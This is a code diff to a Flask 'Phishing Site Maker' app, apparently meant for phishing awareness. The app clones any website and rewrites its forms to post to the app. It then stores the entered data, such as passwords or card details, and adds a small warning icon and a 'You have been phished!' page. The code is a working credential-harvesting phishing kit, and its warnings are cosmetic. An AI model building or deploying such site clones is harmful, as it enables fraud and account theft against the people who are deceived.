@@ -3,16 +3,11 @@ from bs4 import BeautifulSoup
 import os
 import requests
 import json
-from transformers import pipeline, GPT2LMHeadModel, GPT2Tokenizer
+from urllib.parse import urljoin
+
 
 app = Flask(__name__)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-
-# Initialize the local model using HuggingFace Transformers
-model_name = 'gpt2'
-model = GPT2LMHeadModel.from_pretrained(model_name)
-tokenizer = GPT2Tokenizer.from_pretrained(model_name)
-generator = pipeline('text-generation', model=model, tokenizer=tokenizer, pad_token_id=tokenizer.eos_token_id)
 
 def scrape_website(url):
     response = requests.get(url)
@@ -33,7 +28,7 @@ def copy_resources(soup, base_url, target_dir):
             resource_url = tag[attr]
             
             if not resource_url.startswith(('http', 'https')):
-                resource_url = requests.compat.urljoin(base_url, resource_url)
+                resource_url = urljoin(base_url, resource_url)
             
             try:
                 resource_content = requests.get(resource_url).content
@@ -52,37 +47,37 @@ def copy_resources(soup, base_url, target_dir):
     with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
         file.write(soup.prettify())
 
-def generate_form_with_local_model(action_url):
-    prompt = f"""
-    Generate a simple HTML form with two inputs - one for username and one for password - and a submit button.
-    The form should have the action URL set to "{action_url}" and the method set to "POST".
-    """
-    generated = generator(prompt, max_length=150, num_return_sequences=1, truncation=True)
-    form_html = generated[0]['generated_text']
-    return form_html
+
+def add_counter_to_fields(form, counter=1):
+    for field in form.find_all(['input', 'textarea', 'select']):
+        if field.has_attr('name'):
+            field['name'] = f"{counter}_{field['name']}"
+            counter += 1
+        # if field.has_attr('id'):
+        #     field['id'] = f"{counter}_{field['id']}"
+        #     counter += 1
+        # Recursively call the function for nested fields
+        if field.find(['input', 'textarea', 'select']):
+            add_counter_to_fields(field, counter)
+    return form
 
 def replicate_form(form, action_url):
     form['action'] = action_url
     form['method'] = 'POST'
-    count = 1
-    for input_tag in form.find_all(['input', 'textarea', 'select']):
-        input_tag['name'] = input_tag.get('name', f'user_input_{count}')
-        count += 1
+    add_counter_to_fields(form)
+    # count = 1
+    # for input_tag in form.find_all(['input', 'textarea', 'select']):
+    #     input_tag['name'] = input_tag.get('name', f'user_input_{count}')
+    #     count += 1
     return str(form)
 
 def add_phishing_form(soup, target_dir, site_id):
     forms = soup.find_all('form')
     action_url = url_for('handle_submit', site_id=site_id)
-    if not forms:
-        form_html = generate_form_with_local_model(action_url)
+    for form in forms:
+        form_html = replicate_form(form, action_url)
         form_soup = BeautifulSoup(form_html, 'html.parser')
-        soup.body.insert(0, form_soup)
-    else:
-        for form in forms:
-            form_html = replicate_form(form, action_url)
-            form_soup = BeautifulSoup(form_html, 'html.parser')
-            form.replace_with(form_soup)
-    
+        form.replace_with(form_soup)
     with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
         file.write(soup.prettify())
 
@@ -112,8 +107,51 @@ def index_post():
 
 @app.route('/site/<int:site_id>')
 def view_generated_site(site_id):
-    generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
-    return send_from_directory(generated_site_dir, 'index.html')
+    icon_code = '''
+<div id="phishing-icon" title="Beware - This is a phishing site. Click here for more information.">
+<div id="phishing-icon-container">
+  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" alt="Phishing Icon" id="phishing-icon" ><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M12 15H12.01M12 12V9M4.98207 19H19.0179C20.5615 19 21.5233 17.3256 20.7455 15.9923L13.7276 3.96153C12.9558 2.63852 11.0442 2.63852 10.2724 3.96153L3.25452 15.9923C2.47675 17.3256 3.43849 19 4.98207 19Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
+  </div>
+</div>
+<script>
+  document.getElementById('phishing-icon').addEventListener('click', function() {
+    window.location.href = '/about';
+  });
+</script>
+<style>
+  #phishing-icon-container {
+    position: fixed;
+    top: 10px;
+    right: 10px;
+    z-index: 1000;
+    background-color: #fff;
+    border-radius: 100px;
+    height: 25px;
+    width: 25px;
+  }
+  #phishing-icon {
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    text-align: center;
+  }
+  #phishing-icon:hover::after {
+    content: attr(title);
+    position: absolute;
+    top: 25px;
+    right: 30px;
+    background-color: #fff;
+    border: 1px solid #ddd;
+    padding: 5px;
+    font-size: 12px;
+  }
+</style>
+'''
+    with open(os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'index.html'), 'r', encoding='utf-8') as file:
+        html = file.read() + icon_code
+    return html
+    # generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
+    # return send_from_directory(generated_site_dir, 'index.html')
 
 @app.route('/site/<int:site_id>/static/<path:filename>')
 def serve_static_file(site_id, filename):
@@ -136,16 +174,19 @@ def handle_submit(site_id):
         json.dump(data_list, file, ensure_ascii=False)
     
     return f"""
+    <title>You have been phished! - Take Action - Phishing Site Maker - Made by Amit and Orel</title>
     <link rel="stylesheet" href="/static/css/style.css">
     <div class="center">
         <div>
             <h1>You have been phished!</h1>
             <p>Your submitted data: {data}</p>
+            <p><b>Click on the button below to view and delete collected data:</b></p>
             <p><a href='/data/{site_id}'><button class="submit-button">View Collected Data</button></a></p>
             <p>Please delete your data if it's real and take necessary precautions.</p>
             <p style="color: red">If you've enterd a credit card details - block it as fast as possible.</p>
             <p style="color: red">If you've enterd a password - reset it as fast as possible.</p>
             <p><b>Stay safe on the internet. Be aware of phishing sites.</b></p>
+            <p><a href='/site/{site_id}'><button class="submit-button">View Phishing Site</button></a></p>
         </div>
     </div>
     """
@@ -167,13 +208,15 @@ def view_data(site_id):
         if os.path.exists(data_file):
             with open(data_file, 'r', encoding='utf-8') as file:
                 data_list = json.load(file)
-            response_html = '<link rel="stylesheet" href="/static/css/style.css"> <h1>Collected Data</h1><ul>'
+            response_html = '<title>Collected Data - Phishing Site Maker - Made by Amit and Orel</title> <link rel="stylesheet" href="/static/css/style.css"> <h1>Collected Data</h1><ul>'
             for i, data in enumerate(data_list):
-                response_html += f"<li>{data} <form method='POST' style='display:inline;'><input type='hidden' name='data_index' value='{i}'><button class='submit-button' type='submit'>Delete</button></form></li>"
+                response_html += f"<li>{data} <form method='POST' style='display:inline;'><input type='hidden' name='data_index' value='{i}'><button class='submit-button red' type='submit'>Delete</button></form></li>"
+                response_html += "<hr>"
             response_html += "</ul>"
+            response_html += f"<p><a href='/'><button class='submit-button'>Back to Phishing Generator</button></a></p> <p><a href='/site/{site_id}'><button class='submit-button'>View Phishing Site</button></a></p>"
             return Response(response_html, mimetype='text/html')
         else:
-            return "No data found."
+            return '<title>Collected Data - Phishing Site Maker - Made by Amit and Orel</title> <link rel="stylesheet" href="/static/css/style.css"> <h1>No data found.</h1> <p><a href="/"><button class="submit-button">Back to Phishing Generator</button></a></p>'
         
 @app.route('/about')
 def about():
